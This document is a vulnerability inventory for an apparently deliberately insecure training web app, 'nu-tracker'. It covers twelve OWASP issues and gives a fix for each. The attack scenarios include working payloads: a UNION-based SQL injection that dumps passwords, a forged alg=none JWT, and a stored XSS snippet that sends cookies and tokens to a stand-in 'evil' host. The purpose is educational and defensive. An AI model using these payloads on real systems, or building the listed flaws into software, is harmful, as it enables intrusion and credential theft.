# Security Analysis — nu-tracker

This document inventories every intentional vulnerability in the nu-tracker
application. Each entry covers location, description, attack scenario,
impact, recommended mitigation (with code example), and the relevant OWASP
Top 10 (2021) category.

All vulnerable lines are tagged in source with `# VULN-[ID]: [name]`.

---

## V1 — SQL Injection

- **Location**: `routes/inventory.py` — `search_items()` (the `sql = f"..."`
  line in `GET /api/inventory/search`).
- **Description**: The search query is built with an f-string that
  concatenates the raw `q` query parameter directly into a `LIKE` clause.
  No parameter binding, no escaping.
- **Attack scenario**: An authenticated user hits
  `/api/inventory/search?q=' UNION SELECT id, username, password, role, '', '', '', '', '' FROM users --`
  and exfiltrates every user record including plaintext passwords. A
  simpler `' OR 1=1 --` returns every row.
- **Impact**: Confidentiality and integrity of the entire SQLite database.
  An attacker can read any table, and (because SQLite supports
  `ATTACH DATABASE`) potentially write files on disk.
- **Mitigation**: Use parameter binding:
  ```python
  rows = conn.execute(
      "SELECT * FROM inventory_items WHERE name LIKE ? OR description LIKE ?",
      (f"%{q}%", f"%{q}%"),
  ).fetchall()
  ```
- **OWASP 2021**: A03:2021 — Injection.

## V2 — Hardcoded Credentials

- **Location**: `routes/auth.py` (`ADMIN_USERNAME` / `ADMIN_PASSWORD`
  constants) and `database.py` (`_seed()` inserting `admin / admin123`).
- **Description**: A privileged credential pair is committed to source and
  re-seeded into the database on first run.
- **Attack scenario**: Anyone who reads the repo (or the public README,
  which advertises the password) logs in as `admin` immediately.
- **Impact**: Total account takeover.
- **Mitigation**: Generate the bootstrap admin password at install time,
  require a password change on first login, and never commit credentials.
  Use a secrets manager / environment variables:
  ```python
  ADMIN_PASSWORD = os.environ["ADMIN_BOOTSTRAP_PASSWORD"]
  ```
- **OWASP 2021**: A07:2021 — Identification and Authentication Failures.

## V3 — No Password Hashing

- **Location**: `database.py` (schema comment + `_seed()` plaintext inserts)
  and `routes/auth.py` `login()` / `register()` (raw string comparison and
  insertion).
- **Description**: Passwords are stored as plain UTF-8 strings and compared
  directly.
- **Attack scenario**: Any DB read (via SQLi V1, file disclosure, backup
  leak) immediately yields cleartext credentials reusable on other systems.
- **Impact**: Credential reuse across systems; full user impersonation.
- **Mitigation**: Use a vetted password hashing library such as
  `argon2-cffi` or `bcrypt`:
  ```python
  from argon2 import PasswordHasher
  ph = PasswordHasher()
  hashed = ph.hash(password)            # on register
  ph.verify(row["password"], password)  # on login (raises on mismatch)
  ```
- **OWASP 2021**: A02:2021 — Cryptographic Failures.

## V4 — Broken Authentication / Weak JWT

- **Location**: `routes/auth.py` — `JWT_SECRET = "secret"`, `decode_token()`
  (accepts `alg=none`, sets `verify_exp=False`).
- **Description**: Three issues compound: a guessable HMAC secret, an
  `alg=none` bypass path that returns the payload without verifying any
  signature, and disabled expiry checks.
- **Attack scenario**: An attacker forges a JWT with header
  `{"alg":"none","typ":"JWT"}` and payload `{"sub":1,"role":"admin"}`,
  base64url-encodes it with an empty signature, and submits it as a bearer
  token — full admin access without ever knowing the secret.
- **Impact**: Authentication is effectively absent.
- **Mitigation**: Use a long random secret loaded from a secrets store,
  pin the algorithm whitelist, and validate expiry:
  ```python
  jwt.decode(token, SECRET, algorithms=["HS256"])  # raises on bad alg or exp
  ```
- **OWASP 2021**: A07:2021 — Identification and Authentication Failures.

## V5 — Insecure Direct Object Reference (IDOR)

- **Location**: `routes/inventory.py` — `get_item()`, `update_item()`,
  `delete_item()`.
- **Description**: Items use sequential integer IDs and the handlers check
  only that the caller is authenticated — not that they have any
  relationship to the object.
- **Attack scenario**: A viewer user iterates `/api/inventory/1..N` and
  reads or deletes every record, including items owned by other teams.
- **Impact**: Unauthorised disclosure and destruction of inventory data.
- **Mitigation**: Add an ownership/role check and prefer non-guessable
  identifiers (UUIDs):
  ```python
  if user["role"] not in ("admin", "staff"):
      return jsonify({"error": "forbidden"}), 403
  ```
- **OWASP 2021**: A01:2021 — Broken Access Control.

## V6 — No Input Validation / Stored XSS

- **Location**: Backend `routes/inventory.py` `create_item()` /
  `update_item()` (no sanitisation), frontend `static/app.js`
  (`renderInventory`, `openDetail`, `loadLocations` use `innerHTML`).
- **Description**: User-controlled fields (name, description, location,
  rfid_tag) are stored verbatim and rendered into the DOM with
  `element.innerHTML`. HTML and script payloads execute on every viewer's
  browser.
- **Attack scenario**: An attacker creates an item named
  `<img src=x onerror="fetch('//evil/?c='+document.cookie+'&t='+localStorage.nutracker_token)">`.
  When any user opens the inventory tab, their JWT is exfiltrated.
- **Impact**: Stored cross-site scripting → session theft, full account
  takeover of any logged-in viewer.
- **Mitigation**: Output-encode on render (`textContent` instead of
  `innerHTML`, or a template library that escapes by default), and
  validate inputs on the server:
  ```js
  td.textContent = item.name;  // not innerHTML
  ```
- **OWASP 2021**: A03:2021 — Injection (XSS).

## V7 — Sensitive Data Exposure

- **Location**: `routes/auth.py` `list_users()` returning every column;
  `routes/auth.py` `log_request()` writing `requests.log`; `app.py`
  `add_cors_and_log` invoking it on every response; `static/app.js`
  rendering the JWT into the navbar.
- **Description**: Plaintext passwords are returned by an authenticated
  API, JWTs are persisted to a world-readable log alongside request
  bodies, and the active token is displayed in the page chrome.
- **Attack scenario**: Anyone with shell access to the server reads
  `requests.log` and replays any captured bearer token. A casual
  screenshot of the UI leaks the active session.
- **Impact**: Catastrophic — full credential and session disclosure.
- **Mitigation**: Strip sensitive fields from responses; never log auth
  headers or bodies; treat tokens as secret material:
  ```python
  return jsonify([{"id": r["id"], "username": r["username"], "role": r["role"]} for r in rows])
  ```
- **OWASP 2021**: A02:2021 — Cryptographic Failures (and A09:2021 —
  Security Logging and Monitoring Failures, inverted).

## V8 — No Rate Limiting / Brute Force Protection

- **Location**: `routes/auth.py` `login()`.
- **Description**: The login endpoint imposes no throttling, no account
  lockout, no CAPTCHA, no exponential backoff.
- **Attack scenario**: An attacker scripts a password-spraying or
  credential-stuffing attack and brute-forces the `viewer`/`staff`/`admin`
  accounts in seconds.
- **Impact**: Practical password discovery on weak accounts.
- **Mitigation**: Use Flask-Limiter or equivalent and add per-account
  lockout after N failures:
  ```python
  from flask_limiter import Limiter
  limiter = Limiter(get_remote_address, app=app)

  @limiter.limit("5 per minute")
  @auth_bp.post("/api/auth/login")
  def login(): ...
  ```
- **OWASP 2021**: A07:2021 — Identification and Authentication Failures.

## V9 — Verbose Error Messages

- **Location**: `app.py` `handle_exception()` (returns
  `traceback.format_exc()`); `routes/inventory.py` `search_items()` (returns
  the offending SQL); `routes/auth.py` `register()` (returns raw exception
  text).
- **Description**: Unhandled exceptions and validation errors echo internal
  stack traces, library versions, file paths, and SQL fragments to the
  client.
- **Attack scenario**: An attacker triggers errors deliberately to map the
  codebase and pivot from minor probes to targeted exploits (e.g. confirming
  the SQLite version and table names for V1).
- **Impact**: Information disclosure that accelerates other attacks.
- **Mitigation**: Return a generic message and log the detail server-side:
  ```python
  app.logger.exception("...")
  return jsonify({"error": "internal error"}), 500
  ```
- **OWASP 2021**: A05:2021 — Security Misconfiguration.

## V10 — CORS Misconfiguration

- **Location**: `app.py` `add_cors_and_log()`.
- **Description**: Every response sets `Access-Control-Allow-Origin: *`
  with permissive method and header lists. (Browsers do refuse to send
  credentials with a wildcard origin, but the application also accepts
  bearer tokens in `Authorization`, which any origin can attach to its
  own fetches.)
- **Attack scenario**: A victim user is lured to `evil.example`. The page
  uses `fetch('http://localhost:5000/api/auth/users', { headers: { Authorization: 'Bearer ' + stolenToken } })`
  with a token harvested via V6/V7 and exfiltrates the response.
- **Impact**: Enables cross-origin abuse of an otherwise stolen token and
  removes a layer of defense-in-depth.
- **Mitigation**: Allowlist specific origins, and only when needed:
  ```python
  from flask_cors import CORS
  CORS(app, resources={r"/api/*": {"origins": ["https://nu-tracker.example"]}})
  ```
- **OWASP 2021**: A05:2021 — Security Misconfiguration.

## V11 — Insecure HTTP (no TLS)

- **Location**: `app.py` `app.run(host=..., port=5000, debug=True)`.
- **Description**: The server runs on plain HTTP. Credentials, JWTs, and
  inventory data are transmitted in cleartext, and `debug=True` exposes
  the Werkzeug debugger PIN to anyone who can trigger a traceback.
- **Attack scenario**: An attacker on the same Wi-Fi network as a
  warehouse tablet ARP-spoofs the gateway and reads every login POST and
  bearer token from the wire.
- **Impact**: Trivial credential interception.
- **Mitigation**: Run behind a TLS-terminating reverse proxy (nginx,
  Caddy) or use `ssl_context` directly; disable debug mode in production:
  ```python
  app.run(host="0.0.0.0", port=5000, ssl_context=("cert.pem", "key.pem"))
  ```
- **OWASP 2021**: A02:2021 — Cryptographic Failures.

## V12 — Excessive Permissions / No RBAC

- **Location**: `routes/inventory.py` `update_item()`, `delete_item()`;
  `routes/auth.py` `list_users()`; `routes/inventory.py` `get_audit()`.
- **Description**: A `role` column exists on users (and is included in
  JWTs) but is never consulted by any route. A `viewer` account can delete
  inventory, view all users (with passwords), and read the audit log.
- **Attack scenario**: A viewer user obtains their token legitimately and
  then issues `DELETE /api/inventory/1..10`, wiping the entire catalog.
- **Impact**: Loss of integrity and availability; privacy breach.
- **Mitigation**: Enforce role checks centrally, e.g. with a decorator:
  ```python
  def require_role(*allowed):
      def wrap(fn):
          @wraps(fn)
          def inner(*a, **kw):
              user = current_user()
              if not user or user.get("role") not in allowed:
                  return jsonify({"error": "forbidden"}), 403
              return fn(*a, **kw)
          return inner
      return wrap

  @require_role("admin")
  @inventory_bp.delete("/api/inventory/<int:item_id>")
  def delete_item(item_id): ...
  ```
- **OWASP 2021**: A01:2021 — Broken Access Control.

---

## OWASP Top 10 (2021) coverage summary

| OWASP Category                                       | Vulnerabilities       |
|------------------------------------------------------|------------------------|
| A01 — Broken Access Control                           | V5, V12               |
| A02 — Cryptographic Failures                          | V3, V7, V11           |
| A03 — Injection                                       | V1, V6                |
| A05 — Security Misconfiguration                       | V9, V10               |
| A07 — Identification and Authentication Failures      | V2, V4, V8            |
| A09 — Security Logging and Monitoring Failures        | V7 (inverted)         |
